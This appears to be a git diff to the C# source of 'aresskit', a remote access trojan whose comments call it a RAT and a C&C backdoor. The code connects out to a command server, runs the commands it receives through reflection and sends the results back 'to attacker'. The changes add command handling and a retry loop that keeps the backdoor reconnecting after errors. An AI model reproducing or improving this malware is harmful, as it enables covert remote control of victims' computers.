@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Linq;
+using System.Net.Sockets;
 using System.Reflection;
 
 namespace aresskit
@@ -8,7 +9,7 @@ namespace aresskit
     {   
         const string server = "localhost";
         const int port = 9000;
-        const bool hideConsole = true;
+        const bool hideConsole = false;
         const string cmdSplitter = "::";
         
 
@@ -16,8 +17,8 @@ namespace aresskit
         {
             try
             {
-                System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
-                System.Net.Sockets.NetworkStream stream = client.GetStream();
+                TcpClient client = new TcpClient(server, port);
+                NetworkStream stream = client.GetStream();
                 string responseData;
 
                 while (true)
@@ -32,11 +33,16 @@ namespace aresskit
                     int bytes = stream.Read(data, 0, data.Length);
                     responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                     responseData = responseData.Replace("\n", string.Empty);
-
+                    
                     if (responseData == "cd")
                         System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                     else if (responseData == "exit")
-                        System.Environment.Exit(0); // Exit application
+                    {   // Disconnect the attacker from the C&C backdoor.
+
+                        client.Close();
+                    }
+                    else if (responseData == "kill")
+                        Environment.Exit(0); // Exit cleanly upon command 'kill'
                     else if (responseData == "help")
                     {
                         string helpMenu = "\n";
@@ -91,7 +97,7 @@ namespace aresskit
                                     {
                                         if (methodParameters[0].ParameterType.ToString() == "System.String")
                                         {
-                                            for (int i = 1; i < methodData.Length; i++)                                            
+                                            for (int i = 1; i < methodData.Length; i++)
                                                 parameterString += methodData[i] + " ";
                                             parameterArray[0] = parameterString;
                                         }
@@ -101,16 +107,14 @@ namespace aresskit
                             }
                         }
                         catch (Exception e)
-                        {
-                            output = Misc.byteCode(e.ToString() + "\n");
-                        }
+                        { output = Misc.byteCode(e.Message + "\n"); }
                     }
 
                     try
                     {
                         stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                     }
-                    catch (System.IO.IOException)
+                    catch (Exception)
                     {
                         stream.Close();
                         client.Close();
@@ -122,7 +126,7 @@ namespace aresskit
                 stream.Close();
                 client.Close();
             }
-            catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
+            catch (Exception) { while (true) { sendBackdoor(server, port); } } // Pass socket connection silently.
         }
 
         static void Main(string[] args)
@@ -145,13 +149,15 @@ namespace aresskit
             
             while (true)
             {
-                if (Network.checkInternetConn("www.google.com"))
+                if (Network.checkInternetConn("www.google.com") || server == "localhost")
                 {
                     try
                     {
                         // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
                         sendBackdoor(server, port);
                     }
+                    catch (SocketException) // Attacker Server has most likely forced disconnect
+                    { Console.WriteLine("Attacker has disconnected."); }
                     catch (Exception e)
                     { Console.WriteLine(e); } // pass silently
                 }
